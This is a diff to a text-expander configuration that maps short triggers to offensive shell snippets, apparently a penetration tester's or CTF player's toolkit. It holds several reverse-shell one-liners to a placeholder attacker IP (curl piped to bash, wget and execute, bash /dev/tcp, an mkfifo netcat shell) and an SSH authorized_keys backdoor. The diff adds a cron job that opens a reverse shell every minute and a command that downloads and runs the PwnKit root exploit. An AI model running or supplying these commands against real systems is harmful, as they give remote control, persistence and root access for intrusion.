@@ -62,16 +62,16 @@ matches:
     replace: "impacket-smbserver -smb2support share ."
 
   - trigger: ":pyserver"
-    replace: "python3 -m http.server "
+    replace: "python3 -m http.server"
   
   - trigger: ":phpserver"
-    replace: "php -S 0.0.0.0:"                                                  
+    replace: "php -S 0.0.0.0:"
                                                                                 
-  - trigger: ":responder"                                                       
-    replace: "sudo responder -I tun0"                                           
+  - trigger: ":responder"
+    replace: "sudo responder -I tun0"
                                                                                 
-  - trigger: ":nc"                                                              
-    replace: nc -nvlp 443                                                                          
+  - trigger: ":nc"
+    replace: nc -nvlp 443
 # ENUMERATION
   - trigger: ":nmap"
     replace: sudo nmap -sC -sV -v -p- -o nmap --min-rate 
@@ -88,14 +88,15 @@ matches:
 # REVERSE SHELLS                                                                
   # LINUX                                                                       
   - trigger: ":rcurl"                                                           
-    replace: curl http://{{IP}}/shell.sh | bash                                 
+    replace: curl http://{{IP}}/shell.sh | bash
                                                                                 
-  - trigger: ":rwget"                                                           
-    replace: wget http://{{IP}}/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh                                                                        
+  - trigger: ":rwget"
+    replace: wget http://{{IP}}/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
+    
   - trigger: ":rbash"
     replace: bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'
 
-  - trigger: ":mkfifo"                                                          
+  - trigger: ":mkfifo"
     replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 443 >/tmp/f
     
   # WINDOWS
@@ -123,6 +124,8 @@ matches:
     replace: |
       mkdir -p ~/.ssh
       echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
+  - trigger: ":cronpersist"
+    replace: (crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'") | crontab -
   
   - trigger: ":wget"
     replace: wget http://{{IP}}/
@@ -143,3 +146,7 @@ matches:
 
   - trigger: ":suid"
     replace: find / -perm -u=s -type f 2>/dev/null
+
+  - trigger: ":root"
+    replace: |
+      wget http://{{IP}}/PwnKit && chmod +x PwnKit && ./PwnKit
